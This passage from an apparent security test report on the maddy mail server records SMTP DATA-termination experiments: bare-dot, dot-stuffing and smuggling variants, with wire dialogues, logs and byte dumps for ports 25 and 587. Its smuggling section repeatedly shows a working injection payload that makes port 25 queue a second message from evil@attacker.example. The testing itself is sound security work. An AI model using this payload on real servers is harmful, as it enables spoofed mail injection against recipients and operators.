EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH: b'235 2.0.0 Authentication succeeded\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nbefore dot line\r\n.\r\nAFTER DOT LINE ONE\r\nAFTER DOT LINE TWO\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n501 5.5.2 Bad command\r\n501 5.5.2 Bad command\r\n501 5.5.2 Bad command\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`middot_587_run2`):
```text
submission: incoming message	{"msg_id":"35b5096f","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:59426","username":"usera@localhost"}
submission: accepted	{"msg_id":"35b5096f"}
[debug] submission: reset	
submission: 501 5.5.2 Bad command
submission: 501 5.5.2 Bad command
submission: 501 5.5.2 Bad command
queue: will retry	{"attempts_count":1,"msg_id":"35b5096f","next_try_delay":"14m59.999998859s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`middot_587_run2`):
```text
MSGIDS: 35b5096f
--- 35b5096f.body (od -c) ---
0000000   b   e   f   o   r   e       d   o   t       l   i   n   e  \n
0000020
--- 35b5096f.header ---
Dkim-Signature: a=rsa-sha256;
 bh=6+kgp9p+jwogM+Xe+oD0T+lD6b5pPSE8WZ8B+zSH2Rc=; c=relaxed/relaxed;
 d=localhost;
 h=Subject:Subject:Sender:To:To:Cc:From:From:Date:Date:MIME-Version:Content-Type:Content-Transfer-Encoding:Reply-To:In-Reply-To:Message-Id:Message-Id:References:Autocrypt:Openpgp; i=usera@localhost; s=default; t=1783489167; v=1; x=1783921167; b=yqZtWGzeiInOLgOxdXiws645OZ/fS86/saz12sB4OxQn17Is59e9R+sHGVbZ4pHt51yY8S8ttLAyVcW+omwUlaoV16sjI3nHxxBH/NWwd95nheRJ2CLIGSLSK5rqxWvqa/dTj78c1ymUFcSqKjBUXQ/s4beyudVzAzfC93xc4ZEenRkoMKWndvZa6oxwf+rBTUA9uTZ20E6QaHe/IlpUqQNEySoojkx7dv80v4/eC31XsYKOYLiuB+34ojFjHQxKNuKzpuHtYuxykL/joSAP23NVF9GQoBpREuG2wos7kk1clOscyIttbIOn4UnE/ND2kLFshHTNlA05IAeQSyTurw==;
Received:  by localhost (envelope-sender <usera@localhost>) with ESMTP id
 35b5096f; Wed, 08 Jul 2026 05:39:27 +0000
Date: Wed, 8 Jul 2026 05:39:27 +0000
Message-Id: <ed78f857-7261-446d-9b0d-a05068405eac@localhost>
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- 35b5096f.meta ---
{"MsgMeta":{"ID":"35b5096f","OriginalFrom":"usera@localhost","DontTraceSender":true,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:39:26.592866349Z","LastAttempt":"2026-07-08T05:39:27.241976667Z"}
```
*Exact transmitted DATA payload* `middot` — mid-body bare-dot followed by more data then the real terminator:
`od -c`:
```text
0000000   F   r   o   m   :       <   u   s   e   r   a   @   l   o   c
0000020   a   l   h   o   s   t   >  \r  \n   T   o   :       <   d   e
0000040   s   t   @   l   o   c   a   l   h   o   s   t   >  \r  \n   S
0000060   u   b   j   e   c   t   :       q   1       t   e   s   t  \r
0000100  \n  \r  \n   b   e   f   o   r   e       d   o   t       l   i
0000120   n   e  \r  \n   .  \r  \n   A   F   T   E   R       D   O   T
0000140       L   I   N   E       O   N   E  \r  \n   A   F   T   E   R
0000160       D   O   T       L   I   N   E       T   W   O  \r  \n   .
0000200  \r  \n
0000202
```
`od -An -tx1` (hex):
```text
 46 72 6f 6d 3a 20 3c 75 73 65 72 61 40 6c 6f 63
 61 6c 68 6f 73 74 3e 0d 0a 54 6f 3a 20 3c 64 65
 73 74 40 6c 6f 63 61 6c 68 6f 73 74 3e 0d 0a 53
 75 62 6a 65 63 74 3a 20 71 31 20 74 65 73 74 0d
 0a 0d 0a 62 65 66 6f 72 65 20 64 6f 74 20 6c 69
 6e 65 0d 0a 2e 0d 0a 41 46 54 45 52 20 44 4f 54
 20 4c 49 4e 45 20 4f 4e 45 0d 0a 41 46 54 45 52
 20 44 4f 54 20 4c 49 4e 45 20 54 57 4f 0d 0a 2e
 0d 0a
```
**Dot-stuffing (un-stuffing) control.** Payload lines `..one leading dot` and `...two leading dots` plus `normal line`. The stored `.body` is `.one leading dot\n..two leading dots\nnormal line\n` — exactly **one** leading dot removed from each stuffed line, per `stateDot`/`stateData` un-stuffing. This confirms the reader is doing RFC 5321 dot-transparency, not naive line copying. **Both runs, both ports:**

*Port 25 — run 1 / run 2:*
*Wire dialogue* (`dotstuffed_25_run1`):
```text
##### Q1 variant=dotstuffed port=25 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\n..one leading dot\r\n...two leading dots\r\nnormal line\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`dotstuffed_25_run1`):
```text
smtp: incoming message	{"msg_id":"87b2e238","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:59156"}
smtp: accepted	{"msg_id":"87b2e238"}
[debug] smtp: reset	
queue: will retry	{"attempts_count":1,"msg_id":"87b2e238","next_try_delay":"14m59.999999131s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`dotstuffed_25_run1`):
```text
MSGIDS: 87b2e238
--- 87b2e238.body (od -c) ---
0000000   .   o   n   e       l   e   a   d   i   n   g       d   o   t
0000020  \n   .   .   t   w   o       l   e   a   d   i   n   g       d
0000040   o   t   s  \n   n   o   r   m   a   l       l   i   n   e  \n
0000060
--- 87b2e238.header ---
Received: from client.test (localhost [127.0.0.1]) by localhost
 (envelope-sender <usera@localhost>) with ESMTP id 87b2e238; Wed, 08 Jul
 2026 05:39:31 +0000
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- 87b2e238.meta ---
{"MsgMeta":{"ID":"87b2e238","OriginalFrom":"usera@localhost","DontTraceSender":false,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:39:30.768062757Z","LastAttempt":"2026-07-08T05:39:31.418054671Z"}
```
*Wire dialogue* (`dotstuffed_25_run2`):
```text
##### Q1 variant=dotstuffed port=25 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\n..one leading dot\r\n...two leading dots\r\nnormal line\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`dotstuffed_25_run2`):
```text
smtp: incoming message	{"msg_id":"56cf9bee","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:33274"}
smtp: accepted	{"msg_id":"56cf9bee"}
[debug] smtp: reset	
queue: will retry	{"attempts_count":1,"msg_id":"56cf9bee","next_try_delay":"14m59.999999151s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`dotstuffed_25_run2`):
```text
MSGIDS: 56cf9bee
--- 56cf9bee.body (od -c) ---
0000000   .   o   n   e       l   e   a   d   i   n   g       d   o   t
0000020  \n   .   .   t   w   o       l   e   a   d   i   n   g       d
0000040   o   t   s  \n   n   o   r   m   a   l       l   i   n   e  \n
0000060
--- 56cf9bee.header ---
Received: from client.test (localhost [127.0.0.1]) by localhost
 (envelope-sender <usera@localhost>) with ESMTP id 56cf9bee; Wed, 08 Jul
 2026 05:39:35 +0000
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- 56cf9bee.meta ---
{"MsgMeta":{"ID":"56cf9bee","OriginalFrom":"usera@localhost","DontTraceSender":false,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:39:34.935670961Z","LastAttempt":"2026-07-08T05:39:35.584845332Z"}
```
*Port 587 — run 1 / run 2:*
*Wire dialogue* (`dotstuffed_587_run1`):
```text
##### Q1 variant=dotstuffed port=587 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH: b'235 2.0.0 Authentication succeeded\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\n..one leading dot\r\n...two leading dots\r\nnormal line\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`dotstuffed_587_run1`):
```text
submission: incoming message	{"msg_id":"3cab66e1","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:39632","username":"usera@localhost"}
submission: accepted	{"msg_id":"3cab66e1"}
[debug] submission: reset	
queue: will retry	{"attempts_count":1,"msg_id":"3cab66e1","next_try_delay":"14m59.999998838s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`dotstuffed_587_run1`):
```text
MSGIDS: 3cab66e1
--- 3cab66e1.body (od -c) ---
0000000   .   o   n   e       l   e   a   d   i   n   g       d   o   t
0000020  \n   .   .   t   w   o       l   e   a   d   i   n   g       d
0000040   o   t   s  \n   n   o   r   m   a   l       l   i   n   e  \n
0000060
--- 3cab66e1.header ---
Dkim-Signature: a=rsa-sha256; bh
 =1KVPTZpk9JWhfXjtd2r5MTpS5MCBi3QaODhwsXbpNcg=; c=relaxed/relaxed;
 d=localhost;
 h=Subject:Subject:Sender:To:To:Cc:From:From:Date:Date:MIME-Version:Content-Type:Content-Transfer-Encoding:Reply-To:In-Reply-To:Message-Id:Message-Id:References:Autocrypt:Openpgp; i=usera@localhost; s=default; t=1783489180; v=1; x=1783921180; b=SGSdImf/1skvIrteMcOJvteb7JMtCfqftsjnI1WmT6lUCYRfwHA6TFJcWDs7Sc3dzhqgICAvyakbwmdS2jq0wLCQiFtTXaXwadZF0D6wdfM+NWfCyZZSlH/d9m9V7zGKnt0oEKASsVwG5YJjwM8XcT8UaqpB7+Sx9jJLAF3e33v5Ncfm9SvZAqfrp0sHnihhT0JRHo6Zk1lUi3ZlbNlgmZglJ40mpohz6vb8tTdGFdJeKkawhqMMC7kCyz1/kAFh67xHSg7O2x7CiKUPmAcHhkY/oFr9eAC+FSe4rW/H9KRixnjS6LEVRipzbV8W4pcWtmoFNVdg+dWDUgU3HPPy0w==;
Received:  by localhost (envelope-sender <usera@localhost>) with ESMTP id
 3cab66e1; Wed, 08 Jul 2026 05:39:40 +0000
Date: Wed, 8 Jul 2026 05:39:40 +0000
Message-Id: <c8a62682-6c30-4a19-afad-205545429ad0@localhost>
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- 3cab66e1.meta ---
{"MsgMeta":{"ID":"3cab66e1","OriginalFrom":"usera@localhost","DontTraceSender":true,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:39:39.403703537Z","LastAttempt":"2026-07-08T05:39:40.096012162Z"}
```
*Wire dialogue* (`dotstuffed_587_run2`):
```text
##### Q1 variant=dotstuffed port=587 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH: b'235 2.0.0 Authentication succeeded\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\n..one leading dot\r\n...two leading dots\r\nnormal line\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`dotstuffed_587_run2`):
```text
submission: incoming message	{"msg_id":"8d572f7c","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:39646","username":"usera@localhost"}
submission: accepted	{"msg_id":"8d572f7c"}
[debug] submission: reset	
queue: will retry	{"attempts_count":1,"msg_id":"8d572f7c","next_try_delay":"14m59.999999259s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`dotstuffed_587_run2`):
```text
MSGIDS: 8d572f7c
--- 8d572f7c.body (od -c) ---
0000000   .   o   n   e       l   e   a   d   i   n   g       d   o   t
0000020  \n   .   .   t   w   o       l   e   a   d   i   n   g       d
0000040   o   t   s  \n   n   o   r   m   a   l       l   i   n   e  \n
0000060
--- 8d572f7c.header ---
Dkim-Signature: a=rsa-sha256; bh
 =1KVPTZpk9JWhfXjtd2r5MTpS5MCBi3QaODhwsXbpNcg=; c=relaxed/relaxed;
 d=localhost;
 h=Subject:Subject:Sender:To:To:Cc:From:From:Date:Date:MIME-Version:Content-Type:Content-Transfer-Encoding:Reply-To:In-Reply-To:Message-Id:Message-Id:References:Autocrypt:Openpgp; i=usera@localhost; s=default; t=1783489184; v=1; x=1783921184; b=zCp5M+r6Z03CXOudDDeyJvNGnx0bd7GSRFZp1VcwsgDuiCSbj6rH0eSf0qOv6YPM3CxeV0lKqDf2Nmht/ICmYJkuvWRP6/0PNIf2setqq7rVnGU0BhWi4YLAR1Oa+/jKgQ+pislaBa3YZVSJ4jhhRIkzuoYNWLX8x6tz27yoQlwPqgg1tnlppbRsSM4RK3YvQgvXSSrRKE7Cq20uJ/iZYPhh4fi4hPxHd+1/4bParfv8jgKX1e56hY8n/ORmca6N+XU0s6pmN8Rjz4AomlxQ4O0j25ERuuUvRduCtY+6Bt+BxGS3S/sSpVfYLS03JalJj/0x+YY5BZ7CV1lOTEihqg==;
Received:  by localhost (envelope-sender <usera@localhost>) with ESMTP id
 8d572f7c; Wed, 08 Jul 2026 05:39:44 +0000
Date: Wed, 8 Jul 2026 05:39:44 +0000
Message-Id: <2305dcc7-40ef-4d38-8d7c-77c04b1af8d4@localhost>
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- 8d572f7c.meta ---
{"MsgMeta":{"ID":"8d572f7c","OriginalFrom":"usera@localhost","DontTraceSender":true,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:39:43.919482068Z","LastAttempt":"2026-07-08T05:39:44.590923612Z"}
```
*Exact transmitted DATA payload* `dotstuffed` — two dot-stuffed lines plus a normal line:
`od -c`:
```text
0000000   F   r   o   m   :       <   u   s   e   r   a   @   l   o   c
0000020   a   l   h   o   s   t   >  \r  \n   T   o   :       <   d   e
0000040   s   t   @   l   o   c   a   l   h   o   s   t   >  \r  \n   S
0000060   u   b   j   e   c   t   :       q   1       t   e   s   t  \r
0000100  \n  \r  \n   .   .   o   n   e       l   e   a   d   i   n   g
0000120       d   o   t  \r  \n   .   .   .   t   w   o       l   e   a
0000140   d   i   n   g       d   o   t   s  \r  \n   n   o   r   m   a
0000160   l       l   i   n   e  \r  \n   .  \r  \n
0000173
```
`od -An -tx1` (hex):
```text
 46 72 6f 6d 3a 20 3c 75 73 65 72 61 40 6c 6f 63
 61 6c 68 6f 73 74 3e 0d 0a 54 6f 3a 20 3c 64 65
 73 74 40 6c 6f 63 61 6c 68 6f 73 74 3e 0d 0a 53
 75 62 6a 65 63 74 3a 20 71 31 20 74 65 73 74 0d
 0a 0d 0a 2e 2e 6f 6e 65 20 6c 65 61 64 69 6e 67
 20 64 6f 74 0d 0a 2e 2e 2e 74 77 6f 20 6c 65 61
 64 69 6e 67 20 64 6f 74 73 0d 0a 6e 6f 72 6d 61
 6c 20 6c 69 6e 65 0d 0a 2e 0d 0a
```

### 4.5 Security consequence: valid SMTP commands after the bare dot are executed (smuggling)

This is the security-relevant end state of Q1. The payload is a benign first message, a bare-dot terminator, then a **complete injected transaction** as if it were a second client: `benign body line\r\n.\r\nMAIL FROM:<evil@attacker.example>\r\nRCPT TO:<victim@localhost>\r\nDATA\r\nSubject: smuggled\r\n\r\nsmuggled body\r\n.\r\n`. Because bytes after the first bare-dot line return to the command loop (§4.1), the injected `MAIL`/`RCPT`/`DATA` are parsed as **real commands**. The two ports diverge — and the divergence is entirely due to *routing policy*, not to boundary framing:

- **Port 25 (unauthenticated intake, no sender-domain gate on this route): the injection SUCCEEDS.** The wire shows a second `250 2.0.0 Roger, accepting mail from <evil@attacker.example>`, a second `250 2.0.0 I'll make sure <victim@localhost> gets this`, a second `354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>`, and a second `250 2.0.0 OK: queued`. The structured log records **two** accepted messages: the benign `usera@localhost` message **and** a second message with `sender:"evil@attacker.example"` -> `victim@localhost`. A single client write thus injected a second, attacker-controlled message.
- **Port 587 (submission): the injected commands ARE interpreted, but the injected sender is rejected by the domain gate.** The wire shows `250 2.0.0 Roger, accepting mail from <evil@attacker.example>` (command accepted) immediately followed by `501 5.1.8 Non-local sender domain` at RCPT — the `default_source { reject 501 5.1.8 }` policy fires because `attacker.example` is non-local. The trailing `502`/`500`/`501` replies are the remaining injected lines being rejected. Crucially, the injected transaction's structured `incoming message` line still carries `username:"usera@localhost"` — the **original** authenticated identity is still pinned to the smuggled transaction (this is the Q1/Q2 intersection; see §5).

The takeaway: maddy (via `net/textproto`) does **not** enter an "unexpected state" and does **not** merge the trailing data into the first message; it cleanly returns to command parsing. Whether that becomes a *smuggled message* depends on the downstream policy of the route, and on port 25 with no sender-domain restriction it does.

**Port 25 — run 1 / run 2:**
*Wire dialogue* (`smuggle_25_run1`):
```text
##### Q1 variant=smuggle port=25 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nbenign body line\r\n.\r\nMAIL FROM:<evil@attacker.example>\r\nRCPT TO:<victim@localhost>\r\nDATA\r\nSubject: smuggled\r\n\r\nsmuggled body\r\n.\r\n'
POST-DATA: b"250 2.0.0 OK: queued\r\n250 2.0.0 Roger, accepting mail from <evil@attacker.example>\r\n250 2.0.0 I'll make sure <victim@localhost> gets this\r\n354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n250 2.0.0 OK: queued\r\n"
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`smuggle_25_run1`):
```text
smtp: 250 SIZE 33554432
smtp: incoming message	{"msg_id":"7da210f8","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:47432"}
smtp: RCPT ok	{"msg_id":"7da210f8","rcpt":"dest@localhost"}
smtp: accepted	{"msg_id":"7da210f8"}
[debug] smtp: reset	
smtp: incoming message	{"msg_id":"bbd18ee7","sender":"evil@attacker.example","src_host":"client.test","src_ip":"127.0.0.1:47432"}
smtp: RCPT ok	{"msg_id":"bbd18ee7","rcpt":"victim@localhost"}
smtp: accepted	{"msg_id":"bbd18ee7"}
[debug] smtp: reset	
```
*Wire dialogue* (`smuggle_25_run2`):
```text
##### Q1 variant=smuggle port=25 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nbenign body line\r\n.\r\nMAIL FROM:<evil@attacker.example>\r\nRCPT TO:<victim@localhost>\r\nDATA\r\nSubject: smuggled\r\n\r\nsmuggled body\r\n.\r\n'
POST-DATA: b"250 2.0.0 OK: queued\r\n250 2.0.0 Roger, accepting mail from <evil@attacker.example>\r\n250 2.0.0 I'll make sure <victim@localhost> gets this\r\n354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n250 2.0.0 OK: queued\r\n"
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`smuggle_25_run2`):
```text
smtp: 250 SIZE 33554432
smtp: incoming message	{"msg_id":"7fe01c2c","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:56610"}
smtp: RCPT ok	{"msg_id":"7fe01c2c","rcpt":"dest@localhost"}
smtp: accepted	{"msg_id":"7fe01c2c"}
[debug] smtp: reset	
smtp: incoming message	{"msg_id":"e195abed","sender":"evil@attacker.example","src_host":"client.test","src_ip":"127.0.0.1:56610"}
smtp: RCPT ok	{"msg_id":"e195abed","rcpt":"victim@localhost"}
smtp: accepted	{"msg_id":"e195abed"}
[debug] smtp: reset	
```
**Port 587 — run 1 / run 2:**
*Wire dialogue* (`smuggle_587_run1`):
```text
##### Q1 variant=smuggle port=587 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH: b'235 2.0.0 Authentication succeeded\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nbenign body line\r\n.\r\nMAIL FROM:<evil@attacker.example>\r\nRCPT TO:<victim@localhost>\r\nDATA\r\nSubject: smuggled\r\n\r\nsmuggled body\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n250 2.0.0 Roger, accepting mail from <evil@attacker.example>\r\n501 5.1.8 Non-local sender domain (msg ID = 6c8c5759)\r\n502 5.5.1 Missing RCPT TO command.\r\n501 5.5.2 Bad command\r\n500 5.5.2 Speak up\r\n501 5.5.2 Bad command\r\n501 5.5.2 Bad command\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`smuggle_587_run1`):
```text
submission: 250 SIZE 33554432
submission: incoming message	{"msg_id":"fab2d8c5","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:53656","username":"usera@localhost"}
submission: RCPT ok	{"msg_id":"fab2d8c5","rcpt":"dest@localhost"}
submission: accepted	{"msg_id":"fab2d8c5"}
[debug] submission: reset	
submission: incoming message	{"msg_id":"6c8c5759","sender":"evil@attacker.example","src_host":"client.test","src_ip":"127.0.0.1:53656","username":"usera@localhost"}
submission: RCPT error	{"effective_rcpt":"victim@localhost","rcpt":"victim@localhost","reason":"reject directive used","smtp_code":501,"smtp_enchcode":"5.1.8","smtp_msg":"Non-local sender domain"}
submission: 501 5.1.8 Non-local sender domain (msg ID = 6c8c5759)
submission: 501 5.5.2 Bad command
submission: 501 5.5.2 Bad command
submission: 501 5.5.2 Bad command
```
*Wire dialogue* (`smuggle_587_run2`):
```text
##### Q1 variant=smuggle port=587 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH: b'235 2.0.0 Authentication succeeded\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nbenign body line\r\n.\r\nMAIL FROM:<evil@attacker.example>\r\nRCPT TO:<victim@localhost>\r\nDATA\r\nSubject: smuggled\r\n\r\nsmuggled body\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n250 2.0.0 Roger, accepting mail from <evil@attacker.example>\r\n501 5.1.8 Non-local sender domain (msg ID = 36e559fe)\r\n502 5.5.1 Missing RCPT TO command.\r\n501 5.5.2 Bad command\r\n500 5.5.2 Speak up\r\n501 5.5.2 Bad command\r\n501 5.5.2 Bad command\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`smuggle_587_run2`):
```text
submission: 250 SIZE 33554432
submission: incoming message	{"msg_id":"ba71516f","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:53672","username":"usera@localhost"}
submission: RCPT ok	{"msg_id":"ba71516f","rcpt":"dest@localhost"}
submission: accepted	{"msg_id":"ba71516f"}
[debug] submission: reset	
submission: incoming message	{"msg_id":"36e559fe","sender":"evil@attacker.example","src_host":"client.test","src_ip":"127.0.0.1:53672","username":"usera@localhost"}
submission: RCPT error	{"effective_rcpt":"victim@localhost","rcpt":"victim@localhost","reason":"reject directive used","smtp_code":501,"smtp_enchcode":"5.1.8","smtp_msg":"Non-local sender domain"}
